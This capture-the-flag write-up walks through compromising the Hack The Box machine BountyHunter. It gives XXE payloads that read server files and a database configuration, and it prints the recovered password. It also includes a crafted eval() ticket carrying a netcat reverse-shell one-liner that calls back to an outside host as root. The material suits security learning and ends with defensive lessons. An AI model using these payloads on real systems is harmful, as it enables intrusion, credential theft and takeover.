---
title: 'BountyHunter'
target: 'Hack The Box — BountyHunter'
difficulty: 'easy'
date: 2025-12-15
summary: 'An HTB machine — scanning with masscan and nmap to find SSH (22) and HTTP (80) on an Ubuntu host, discovering a bounty report submission form at /log_submit.php that sends base64-encoded XML to /tracker_diRbPr00f314.php, intercepting the request with Burp Suite and injecting XXE payloads to read /etc/hostname and /etc/passwd, using a php://filter wrapper to base64-encode and exfiltrate db.php which contains database credentials, SSHing in as the development user with the recovered database password, finding a contract note from John referencing a ticket validation tool, discovering sudo NOPASSWD access to /opt/skytrain_inc/ticketValidator.py which uses Python''s eval() on ticket code lines, crafting a malicious .md ticket that exploits eval() to spawn a reverse shell as root.'
role: 'pentest'
tags: ['nmap', 'masscan', 'dirb', 'xxe', 'xml-injection', 'burp-suite', 'php-filter', 'credential-recovery', 'ssh', 'sudo', 'python', 'eval', 'code-injection', 'reverse-shell', 'privilege-escalation', 'linux']
problem: 'BountyHunter is an easy-rated Ubuntu machine with two open ports — SSH (22) running OpenSSH 8.2p1 and HTTP (80) running Apache 2.4.41. The web application hosts a bug bounty report submission form that processes XML input through a PHP backend without disabling external entity resolution, making it vulnerable to XXE injection. The database configuration file db.php contains credentials that are reused for SSH access as the development user. On the system, a Python ticket validation script runs with sudo NOPASSWD privileges and uses eval() to process ticket data from user-supplied Markdown files, allowing arbitrary code execution as root.'
action: 'Ran masscan to identify open ports and followed up with nmap for service version detection — found 22/tcp (OpenSSH 8.2p1) and 80/tcp (Apache 2.4.41) on Ubuntu. Ran dirb with -X .php to enumerate PHP files — discovered db.php (empty 200 response), index.php, portal.php, and log_submit.php. Navigated to portal.php which displayed a development notice linking to log_submit.php — a Bounty Report System Beta form with fields for Exploit Title, CWE, CVSS Score, and Bounty Reward. Intercepted the form submission with Burp Suite — the POST request to /tracker_diRbPr00f314.php contained base64-encoded then URL-encoded XML data in the data parameter. Decoded the payload to reveal a standard XML bugreport structure with title, cwe, cvss, and reward elements. Injected an XXE payload with DOCTYPE foo declaring an external entity xxe pointing to file:///etc/hostname — the response reflected "bountyhunter" in the Title field, confirming XXE. Read /etc/passwd via XXE to identify the development user (uid 1000, /bin/bash). Attempted to read db.php directly via file:// but PHP code was stripped during XML parsing. Used php://filter/convert.base64-encode/resource=db.php to exfiltrate the file as base64 — decoded to reveal $dbserver="localhost", $dbname="bounty", $dbusername="admin", $dbpassword="m19RoAU0hP41A1sTsq6K", $testuser="test". SSHed in as development@bountyhunter.htb using the database password m19RoAU0hP41A1sTsq6K. Retrieved the user flag. Found contract.txt from John mentioning Skytrain Inc and a ticket validation tool with permissions set up for testing. Ran sudo -l — development can run /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py as root with NOPASSWD. Analyzed the ticketValidator.py script — it reads .md files, checks for a Skytrain Inc ticket header, validates format lines, and uses eval() on the ticket code line after stripping ** markers. Crafted a malicious ticket.md with a code line containing __import__(''os'').system() to spawn a reverse shell. Set up a netcat listener on port 4242 and ran the validator with sudo, pointing it to the crafted ticket — received a reverse shell as root. Retrieved the root flag.'
outcome: 'Gained root access through XXE-based credential exfiltration and Python eval() code injection. An unprotected XML parser in the bounty report system allowed reading server-side files including database credentials reused for SSH, and a sudo-permitted Python script with an eval() sink provided the path to root through a crafted Markdown ticket.'
draft: false
---

## Background

BountyHunter is an easy-rated Linux machine that chains two distinct vulnerability classes — XML External Entity injection for initial access and Python `eval()` abuse for privilege escalation. The web application's bounty report form processes XML without disabling external entities, which turns a simple form submission into a file-reading primitive on the server. From there, it's credential reuse from a database configuration file to SSH, and then exploiting an unsafe `eval()` call in a ticket validation script that runs with sudo privileges. No CVEs, no kernel exploits — just insecure input handling at two different layers of the stack.

---

## Enumeration

Starting with a **masscan** sweep to quickly identify open ports, followed by a targeted **nmap** scan for service versions and default scripts:

```
masscan -p1-65535,U:1-65535 10.10.11.100 --rate=1000 -e tun0
nmap -sV -sC -p 22,80 10.10.11.100
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

Two ports — **SSH on 22** and **HTTP on 80**. The banners confirm Ubuntu with Apache 2.4.41 and OpenSSH 8.2p1. With only two services exposed, the web application on port 80 is the clear entry point.

Running **dirb** to enumerate PHP files on the web server:

```
dirb http://bountyhunter.htb -X .php
```

The scan discovers several endpoints — `db.php` (returns an empty 200 response, meaning the PHP executes but produces no output), `index.php`, `portal.php`, and `log_submit.php`. The empty `db.php` response is interesting — it's likely a database configuration file that sets variables without generating any HTML.

---

## The bounty report form

Navigating to `portal.php` reveals a development notice:

![Browser at bountyhunter.htb/portal.php showing the text "Portal under development. Go here to test the bounty tracker." with "here" as a hyperlink.](/writeups/htb-bountyhunter/01-portal-page.png)

Following the link leads to `log_submit.php` — a **Bounty Report System - Beta** form:

![Browser at bountyhunter.htb/log_submit.php showing the Bounty Report System - Beta page with four input fields — Exploit Title, CWE, CVSS Score, Bounty Reward ($) — and a Submit button.](/writeups/htb-bountyhunter/02-bounty-form.png)

Four fields for submitting a bug bounty report. The form looks straightforward, but intercepting the submission with **Burp Suite** reveals the interesting part — the data isn't sent as plain form parameters. The POST request goes to `/tracker_diRbPr00f314.php` with the form data packed into a single `data` parameter that's base64-encoded and then URL-encoded:

![Burp Suite Repeater showing a POST request to /tracker_diRbPr00f314.php with base64 and URL-encoded data in the request body. The Response panel shows an HTML table with "If DB were ready, would have added:" followed by Title, CWE, Score, and Reward fields. The Inspector panel on the right shows the data URL-decoded and then base64-decoded, revealing an XML bugreport structure with title, cwe, cvss, and reward elements.](/writeups/htb-bountyhunter/03-burp-xml.png)

Decoding the payload through the Inspector reveals the underlying XML structure:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<bugreport>
  <title>title</title>
  <cwe>0</cwe>
  <cvss>0</cvss>
  <reward>0</reward>
</bugreport>
```

The server parses this XML and reflects the field values back in the response. XML input that gets parsed server-side and reflected back — that's a textbook setup for XXE injection.

---

## XXE injection — reading server files

Testing for XXE by injecting an external entity definition that reads `/etc/hostname`:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<bugreport>
  <title>&xxe;</title>
  <cwe>0</cwe>
  <cvss>0</cvss>
  <reward>0</reward>
</bugreport>

```

The payload declares an external entity `xxe` that references the local file, then uses `&xxe;` in the title element. After base64-encoding and URL-encoding the modified XML and sending it through Burp:

![Burp Suite Repeater showing the XXE injection payload. The Response panel shows "bountyhunter" reflected in the Title table cell. The Inspector panel shows the decoded XML with the DOCTYPE declaration defining entity xxe as SYSTEM "file:///etc/hostname" and the entity reference in the title element.](/writeups/htb-bountyhunter/04-xxe-hostname.png)

The response reflects **bountyhunter** in the Title field — the contents of `/etc/hostname`. The XML parser is resolving external entities, giving full read access to any file the web server process can read.

Reading `/etc/passwd` via the same technique identifies the local user accounts. The key entry is **development** (uid 1000) with a `/bin/bash` shell — a real user account on the system.

The next target is `db.php` — the database configuration file that returned an empty response earlier. Attempting to read it with `file:///var/www/html/db.php` fails because the PHP code gets processed during XML parsing and stripped out. The workaround is using a **PHP filter wrapper** to base64-encode the file contents before they enter the XML parser:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php"> ]>
```

![Burp Suite Repeater showing the php://filter XXE payload. The Response panel in Pretty view shows a base64-encoded string in the Title table cell. The Inspector panel decodes the base64 to reveal PHP source code — $dbserver = "localhost", $dbname = "bounty", $dbusername = "admin", $dbpassword = "m19RoA" followed by a redacted portion and "Tsq6K", $testuser = "test".](/writeups/htb-bountyhunter/05-xxe-dbphp.png)

The base64 output decodes to the full PHP source of `db.php`:

```php
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

A database password in a configuration file — and the TODO comment suggests the login system isn't even implemented yet. The password `m19RoAU0hP41A1sTsq6K` is worth testing against SSH for the `development` user found in `/etc/passwd`.

---

## Shell as development

The database password works for SSH — credential reuse from the web application's database configuration to the system account:

```
ssh development@bountyhunter.htb
```

![Terminal showing SSH login as development@bountyhunter.htb. Ubuntu 20.04.2 LTS welcome banner with system information showing IPv4 address 10.10.11.100. Commands id showing uid=1000(development) gid=1000(development) groups=1000(development), and ls showing contract.txt and user.txt highlighted in the home directory.](/writeups/htb-bountyhunter/06-ssh-development.png)

A shell as **development@bountyhunter** — the user flag was retrieved. Two files sit in the home directory: `user.txt` and a `contract.txt` that provides the hint for privilege escalation:

![Terminal showing cat contract.txt output. Message from John addressed to the team — he will be out of the office this week, asks the team to complete the contract with Skytrain Inc, references a past "rm -rf" incident, mentions an internal tool with failing ticket validation that needs investigation, and notes that permissions have been set up for testing.](/writeups/htb-bountyhunter/07-contract-txt.png)

John's note mentions an **internal tool** with **failing ticket validation** and says he's **set up the permissions** for testing. That's a direct pointer to a sudo-permitted command.

---

## Privilege escalation — ticketValidator.py

Checking sudo permissions confirms what the contract hinted at:

```
sudo -l
```

![Terminal showing sudo -l output for development on bountyhunter. Matching Defaults entries include env_reset, mail_badpass, and secure_path. The highlighted section shows User development may run the following commands — (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py.](/writeups/htb-bountyhunter/08-sudo-l.png)

The `development` user can run `/opt/skytrain_inc/ticketValidator.py` as **root** with **no password**. Examining the script reveals its logic — it reads `.md` files as "tickets," validates a specific format (checking for a Skytrain Inc header, a ticket code line, and other structural requirements), and critically, uses Python's `eval()` to process the ticket code value after stripping `**` markers from the Markdown formatting.

The `eval()` call is the vulnerability. While the script checks that the evaluated result is greater than 100 for the ticket to be valid, `eval()` executes arbitrary Python expressions before returning a value. By crafting a ticket code line that performs a useful side effect — like spawning a shell — before the comparison happens, the validation check becomes irrelevant.

The crafted ticket:

```markdown
# Skytrain Inc
## Ticket to New Haven
__Ticket Code:__
**704+__import__('os').system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.79 4242 >/tmp/f")**
```

The `704` satisfies the numeric check, and the `+` chains it with `__import__('os').system()` which executes a reverse shell command. The `**` markers satisfy the Markdown formatting the script expects to strip. Setting up a netcat listener and running the validator:

```
nc -lvnp 4242
```

```
sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

Providing the path to the crafted ticket file triggers the `eval()` call, which executes the reverse shell payload before completing the arithmetic:

![Terminal showing nc -lvnp 4242 receiving a connection from 10.10.11.100 port 42462. Commands id returning uid=0(root) gid=0(root) groups=0(root), pwd showing /var/tmp, cd to the root home directory, and ls showing root.txt highlighted alongside snap.](/writeups/htb-bountyhunter/09-root-shell.png)

**Root** — the reverse shell connects back with uid=0. The root flag was retrieved.

---

## What I took from this

BountyHunter demonstrates how XXE injection turns an XML parser into a file-reading oracle. The vulnerability exists because the PHP backend parses the XML with external entity resolution enabled — the default behavior in many XML parsers. The fix is a single line (`libxml_disable_entity_loader(true)` in older PHP, or configuring the parser with `LIBXML_NOENT` disabled), but the default-insecure configuration means any developer who doesn't explicitly disable it is vulnerable. The PHP filter wrapper trick is worth remembering — when the target file contains code that gets interpreted during parsing, encoding it to base64 first preserves the raw content through the XML pipeline.

The credential reuse from `db.php` to SSH is a pattern that shows up constantly in real environments. Database configuration files contain credentials that developers often reuse across systems because they're "just for the database." But a configuration file readable through any file-disclosure vulnerability — XXE, LFI, directory traversal, backup exposure — becomes a credential for every service where that password was reused. The defense isn't just protecting the file; it's using unique credentials per service so that one leak doesn't cascade.

The `eval()` privilege escalation is a clean example of why `eval()` should never touch user-controlled input, regardless of validation around it. The script validates the format and checks the result, but `eval()` executes the expression before the result is checked — any side effect in the expression (like `os.system()`) fires regardless of whether the validation passes or fails afterward. Python's `ast.literal_eval()` exists specifically for cases where you need to evaluate simple expressions safely, and anything more complex should be parsed explicitly rather than handed to the interpreter. The broader lesson is that any code execution primitive — `eval()`, `exec()`, `system()`, template injection sinks — running under elevated privileges is a guaranteed escalation path if an attacker can control the input.
